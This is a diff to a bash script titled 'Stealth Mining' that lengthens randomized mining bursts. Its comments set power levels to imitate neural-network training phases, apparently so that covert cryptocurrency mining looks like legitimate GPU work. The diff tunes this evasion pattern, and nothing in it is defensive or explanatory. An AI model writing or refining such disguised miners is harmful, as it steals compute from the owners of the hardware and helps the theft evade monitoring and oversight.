@@ -14,11 +14,11 @@ POWER_HIGH=400  # ~80% - like forward/backward pass
 POWER_FULL=600  # ~90% - like gradient computation
 
 echo "=== Stealth Mining Started ==="
-echo "Pattern: random bursts (2-5 min mine, 1-3 min rest)"
+echo "Pattern: random bursts (4-8 min mine, 1-3 min rest)"
 
 while true; do
-    # Random mine duration: 120-300 seconds (2-5 min)
-    MINE_TIME=$(( RANDOM % 180 + 120 ))
+    # Random mine duration: 240-480 seconds (4-8 min)
+    MINE_TIME=$(( RANDOM % 240 + 240 ))
     
     # Random rest duration: 60-180 seconds (1-3 min)
     REST_TIME=$(( RANDOM % 120 + 60 ))
